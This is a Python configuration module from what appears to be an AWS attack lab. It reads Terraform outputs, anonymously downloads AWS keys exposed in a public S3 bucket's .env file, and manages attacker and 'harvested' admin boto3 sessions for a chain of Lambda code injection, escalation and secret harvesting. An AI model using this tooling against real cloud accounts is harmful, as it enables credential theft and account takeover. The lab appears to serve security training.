"""
config.py -- Configuration bridge between Terraform outputs and attack scripts.

Reads Terraform outputs to get infrastructure details (bucket names, function
names, user names, etc.) and manages multiple boto3 sessions for different
credential sets used during the attack.

Two credential flows:
  1. "Attacker way" (default): Download pipeline-config.env from the public
     S3 bucket anonymously, parse AWS credentials from the file content.
  2. "Shortcut way" (fallback): Read credentials directly from Terraform outputs.
"""
import json
import os
import re
import subprocess
import sys
from pathlib import Path
from typing import Any, Dict, Optional

import boto3
import botocore
from botocore import UNSIGNED
from botocore.config import Config

from utils import print_error, print_info, print_success, print_warning


class AttackConfig:
    """
    Manages configuration, credentials, and boto3 sessions for the attack.

    Reads Terraform outputs to discover infrastructure details and provides
    accessor properties for each value the attack scripts need.
    """

    def __init__(self, terraform_dir: Optional[str] = None) -> None:
        """
        Initialize the config by reading Terraform outputs.

        Args:
            terraform_dir: Path to the terraform/ directory. Defaults to
                           ../terraform relative to this script.
        """
        if terraform_dir is None:
            terraform_dir = str(
                Path(__file__).parent.parent / "terraform"
            )
        self.terraform_dir = terraform_dir
        self._tf_outputs: Dict[str, Any] = {}
        self._attacker_session: Optional[boto3.Session] = None
        self._admin_session: Optional[boto3.Session] = None
        self._attacker_creds: Optional[Dict[str, str]] = None
        self._admin_creds: Optional[Dict[str, str]] = None
        self._load_terraform_outputs()

    # =========================================================================
    # Terraform Output Loading
    # =========================================================================

    def _load_terraform_outputs(self) -> None:
        """
        Read Terraform outputs via subprocess and parse the JSON result.

        Runs `terraform output -json` in the terraform directory and stores
        the parsed output values for use by accessor properties.
        """
        try:
            result = subprocess.run(
                ["terraform", "output", "-json"],
                cwd=self.terraform_dir,
                capture_output=True,
                text=True,
                timeout=30,
            )
            if result.returncode != 0:
                print_error(
                    f"Terraform output failed: {result.stderr.strip()}"
                )
                print_info(
                    "Make sure you have run 'terraform apply' in the "
                    "terraform/ directory first."
                )
                sys.exit(1)

            raw = json.loads(result.stdout)
            # Terraform output -json wraps each value in {"value": ..., "type": ...}
            self._tf_outputs = {
                k: v.get("value") for k, v in raw.items()
            }
        except FileNotFoundError:
            print_error(
                "Terraform CLI not found. Install Terraform >= 1.10.0."
            )
            sys.exit(1)
        except json.JSONDecodeError as exc:
            print_error(f"Failed to parse Terraform output: {exc}")
            sys.exit(1)
        except subprocess.TimeoutExpired:
            print_error("Terraform output timed out after 30 seconds.")
            sys.exit(1)

    # =========================================================================
    # Infrastructure Properties (from Terraform outputs)
    # =========================================================================

    @property
    def bucket_name(self) -> str:
        """Name of the public S3 bucket containing RAG data."""
        return self._tf_outputs.get("rag_bucket_name", "")

    @property
    def bucket_url(self) -> str:
        """HTTPS URL for the public S3 bucket."""
        return self._tf_outputs.get("rag_bucket_url", "")

    @property
    def aws_region(self) -> str:
        """AWS region where infrastructure is deployed."""
        return self._tf_outputs.get("aws_region", "us-east-1")

    @property
    def lambda_function_name(self) -> str:
        """Name of the Lambda function to target for code injection."""
        return self._tf_outputs.get("lambda_function_name", "EC2-init")

    @property
    def lambda_function_arn(self) -> str:
        """ARN of the Lambda function."""
        return self._tf_outputs.get("lambda_function_arn", "")

    @property
    def lambda_execution_role_arn(self) -> str:
        """ARN of the Lambda execution role (has AdministratorAccess)."""
        return self._tf_outputs.get("lambda_execution_role_arn", "")

    @property
    def admin_user_name(self) -> str:
        """Name of the admin IAM user to target (default: frick)."""
        return self._tf_outputs.get("admin_user_name", "frick")

    @property
    def bedrock_user_name(self) -> str:
        """Name of the user with Bedrock access."""
        return self._tf_outputs.get("bedrock_user_name", "rocker")

    @property
    def secrets_manager_names(self) -> list:
        """List of Secrets Manager secret names to harvest."""
        return self._tf_outputs.get("secrets_manager_names", [])

    @property
    def ssm_parameter_names(self) -> list:
        """List of SSM parameter names to harvest."""
        return self._tf_outputs.get("ssm_parameter_names", [])

    # =========================================================================
    # Credential Discovery
    # =========================================================================

    def discover_credentials_from_bucket(self) -> Dict[str, str]:
        """
        The "attacker way": download pipeline-config.env from the public S3
        bucket using an anonymous (unsigned) request, then parse out the
        AWS credentials embedded in the file.

        Returns:
            Dict with keys: access_key_id, secret_access_key, region.

        Raises:
            RuntimeError: If the bucket is not publicly accessible or the
                         config file does not contain credentials.
        """
        print_info(f"Downloading config from s3://{self.bucket_name}/...")

        # Create an anonymous S3 client (no credentials)
        anon_s3 = boto3.client(
            "s3",
            region_name=self.aws_region,
            config=Config(signature_version=UNSIGNED),
        )

        try:
            response = anon_s3.get_object(
                Bucket=self.bucket_name,
                Key="config/pipeline-config.env",
            )
            content = response["Body"].read().decode("utf-8")
        except botocore.exceptions.ClientError as exc:
            raise RuntimeError(
                f"Cannot access public bucket: {exc}. "
                f"Check that S3 Block Public Access is disabled."
            ) from exc

        # Parse credentials from the .env file content
        creds = {}
        for line in content.splitlines():
            line = line.strip()
            if line.startswith("#") or "=" not in line:
                continue
            key, _, value = line.partition("=")
            key = key.strip()
            value = value.strip()
            if key == "AWS_ACCESS_KEY_ID":
                creds["access_key_id"] = value
            elif key == "AWS_SECRET_ACCESS_KEY":
                creds["secret_access_key"] = value
            elif key == "AWS_DEFAULT_REGION":
                creds["region"] = value

        if "access_key_id" not in creds or "secret_access_key" not in creds:
            raise RuntimeError(
                "Credentials not found in pipeline-config.env"
            )

        creds.setdefault("region", self.aws_region)
        self._attacker_creds = creds
        return creds

    def get_credentials_from_terraform(self) -> Dict[str, str]:
        """
        The "shortcut way": read credentials directly from Terraform outputs.

        This is a fallback for when the bucket is not publicly accessible
        (e.g., account-level Block Public Access is enabled).

        Returns:
            Dict with keys: access_key_id, secret_access_key, region.
        """
        creds = {
            "access_key_id": self._tf_outputs.get(
                "compromised_access_key_id", ""
            ),
            "secret_access_key": self._tf_outputs.get(
                "compromised_secret_access_key", ""
            ),
            "region": self.aws_region,
        }
        if not creds["access_key_id"] or not creds["secret_access_key"]:
            print_error(
                "Credentials not found in Terraform outputs. "
                "Run 'terraform apply' first."
            )
            sys.exit(1)
        self._attacker_creds = creds
        return creds

    # =========================================================================
    # boto3 Session Management
    # =========================================================================

    @property
    def attacker_session(self) -> boto3.Session:
        """
        boto3 session using the stolen rag-pipeline-user credentials.

        If credentials have not been discovered yet, attempts the
        bucket method first, then falls back to Terraform outputs.
        """
        if self._attacker_session is not None:
            return self._attacker_session

        if self._attacker_creds is None:
            try:
                self.discover_credentials_from_bucket()
                print_success("Credentials extracted from public S3 bucket")
            except RuntimeError:
                print_warning(
                    "Public bucket access failed, "
                    "falling back to Terraform outputs"
                )
                self.get_credentials_from_terraform()
                print_success("Credentials loaded from Terraform outputs")

        self._attacker_session = boto3.Session(
            aws_access_key_id=self._attacker_creds["access_key_id"],
            aws_secret_access_key=self._attacker_creds["secret_access_key"],
            region_name=self._attacker_creds["region"],
        )
        return self._attacker_session

    def set_admin_credentials(
        self, access_key_id: str, secret_access_key: str
    ) -> None:
        """
        Store admin credentials harvested during the Lambda escalation phase.

        Args:
            access_key_id: The admin user's access key ID.
            secret_access_key: The admin user's secret access key.
        """
        self._admin_creds = {
            "access_key_id": access_key_id,
            "secret_access_key": secret_access_key,
            "region": self.aws_region,
        }
        self._admin_session = boto3.Session(
            aws_access_key_id=access_key_id,
            aws_secret_access_key=secret_access_key,
            region_name=self.aws_region,
        )

    @property
    def admin_session(self) -> Optional[boto3.Session]:
        """
        boto3 session using admin credentials harvested from Lambda.

        Returns None if admin credentials have not been obtained yet
        (they are created during Phase 2: Escalation).
        """
        return self._admin_session

    def require_admin_session(self) -> boto3.Session:
        """
        Return the admin session, or raise an error if it does not exist.

        Used by Phase 3+ scripts that require admin access.
        Raises RuntimeError instead of sys.exit so interactive mode
        can catch it and return to the menu.
        """
        if self._admin_session is None:
            raise RuntimeError(
                "Admin credentials not available. "
                "Run Phase 2 (Escalation) first."
            )
        return self._admin_session

    # =========================================================================
    # Utility
    # =========================================================================

    def get_account_id(self) -> str:
        """
        Get the AWS account ID from the attacker session.

        Returns:
            The 12-digit AWS account ID.
        """
        sts = self.attacker_session.client("sts")
        return sts.get_caller_identity()["Account"]

    def print_config_summary(self) -> None:
        """Print a summary of the current configuration."""
        from rich.table import Table
        from rich import box

        table = Table(
            title="Attack Configuration",
            box=box.ROUNDED,
            show_lines=False,
        )
        table.add_column("Parameter", style="bright_cyan")
        table.add_column("Value", style="white")

        table.add_row("S3 Bucket", self.bucket_name)
        table.add_row("Lambda Function", self.lambda_function_name)
        table.add_row("Admin Target", self.admin_user_name)
        table.add_row("Region", self.aws_region)
        table.add_row(
            "Attacker Creds",
            "Loaded" if self._attacker_creds else "Not yet",
        )
        table.add_row(
            "Admin Creds",
            "Loaded" if self._admin_creds else "Not yet",
        )

        from utils import console
        console.print(table)
